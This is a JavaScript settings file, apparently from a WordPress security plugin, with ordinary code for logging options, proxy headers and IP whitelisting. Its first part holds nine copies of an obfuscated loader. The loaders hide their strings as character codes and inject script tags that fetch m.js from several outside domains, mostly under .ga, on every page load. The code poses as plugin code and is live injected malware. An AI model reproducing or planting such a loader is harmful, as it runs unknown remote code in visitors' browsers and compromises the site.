Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,119,101,108,108,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,114,97,107,101,46,115,116,114,111,110,103,99,97,112,105,116,97,108,97,100,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,114,111,119,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,116,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();function itsec_change_show_error_codes( args ) {
	var show = args[ 0 ];

	if ( show ) {
		jQuery( 'body' ).addClass( 'itsec-show-error-codes' );
	} else {
		jQuery( 'body' ).removeClass( 'itsec-show-error-codes' );
	}
}

function itsec_change_write_files( args ) {
	var enabled = args[ 0 ];

	if ( enabled ) {
		jQuery( 'body' ).removeClass( 'itsec-write-files-disabled' ).addClass( 'itsec-write-files-enabled' );
	} else {
		jQuery( 'body' ).removeClass( 'itsec-write-files-enabled' ).addClass( 'itsec-write-files-disabled' );
	}
}

( function( $ ) {
	function logTypeChanged() {
		var type = jQuery( '#itsec-global-log_type' ).val();

		if ( 'both' === type ) {
			jQuery( '#itsec-global-log_rotation' ).parents( 'tr' ).show();
			jQuery( '#itsec-global-file_log_rotation' ).parents( 'tr' ).show();
			jQuery( '#itsec-global-log_location' ).parents( 'tr' ).show();
		} else if ( 'file' === type ) {
			jQuery( '#itsec-global-log_rotation' ).parents( 'tr' ).hide();
			jQuery( '#itsec-global-file_log_rotation' ).parents( 'tr' ).show();
			jQuery( '#itsec-global-log_location' ).parents( 'tr' ).show();
		} else {
			jQuery( '#itsec-global-log_rotation' ).parents( 'tr' ).show();
			jQuery( '#itsec-global-file_log_rotation' ).parents( 'tr' ).hide();
			jQuery( '#itsec-global-log_location' ).parents( 'tr' ).hide();
		}
	}

	function proxyHeaderChanged() {
		var proxy = $( '#itsec-global-proxy' ).val();

		if ( 'security-check' === proxy ) {
			$( '#itsec-global-ip-scan' ).show();
		} else {
			$( '#itsec-global-ip-scan' ).hide();
		}

		if ( 'manual' === proxy ) {
			$( '.itsec-global-proxy_header-container' ).show();
		} else {
			$( '.itsec-global-proxy_header-container' ).hide();
		}

		updateIp();
	}

	function updateIp() {
		$( '.itsec-global-detected-ip' ).text( itsec_global_settings_page.l10n.loading );
		var proxyType = $( '#itsec-global-proxy' ).val();
		var args = {};

		switch ( proxyType ) {
			case 'manual':
				args.header = $( '#itsec-global-proxy_header' ).val();
				break;
		}

		var data = {
			method: 'get-ip',
			proxy : proxyType,
			args  : args,
		};

		itsecUtil.sendModuleAJAXRequest( 'global', data, function( r ) {
			if ( r.errors.length > 0 ) {
				itsecSettingsPage.showErrors( r.errors, 'global', 'open', 'error' );
				itsecSettingsPage.scrollTop();
			}

			if ( r.response ) {
				$( '.itsec-global-detected-ip' ).text( r.response.ip_l10n );
			}
		} );
	}

	$( function() {
		$( document ).on( 'click', '#itsec-global-add-to-whitelist', function( e ) {
			e.preventDefault();

			var $whitelist = $( '#itsec-global-lockout_white_list' ),
				whitelist = $whitelist.val().trim();
			whitelist += '\n' + itsec_global_settings_page.ip;
			$whitelist.val( whitelist );
		} );

		$( document ).on( 'click', '#itsec-global-reset-log-location', function( e ) {
			e.preventDefault();

			$( '#itsec-global-log_location' ).val( itsec_global_settings_page.log_location );
		} );

		$( document ).on( 'click', '#itsec-global-ip-scan', function( e ) {
			e.preventDefault();

			var $btn = $( this ).attr( 'disabled', true );

			itsecUtil.sendModuleAJAXRequest( 'global', { method: 'scan-ip' }, function( r ) {
				if ( r.errors.length > 0 ) {
					itsecSettingsPage.showErrors( r.errors, 'global', 'open', 'error' );
					itsecSettingsPage.scrollTop();
				}

				if ( r.response ) {
					$( '.itsec-global-detected-ip' ).text( r.response.ip_l10n );
				}

				$btn.attr( 'disabled', false );
			} );
		} );

		$( document ).on( 'change', '#itsec-global-log_type', logTypeChanged );
		$( document ).on( 'change', '#itsec-global-proxy', proxyHeaderChanged );
		$( document ).on( 'change', '#itsec-global-proxy_header', updateIp );
		itsecSettingsPage.events.on( 'modulesReloaded', proxyHeaderChanged );
		itsecSettingsPage.events.on( 'moduleReloaded', function( e, module ) {
			if ( 'global' === module ) {
				proxyHeaderChanged();
			}
		} );

		logTypeChanged();
		proxyHeaderChanged();
	} );
} )( jQuery );
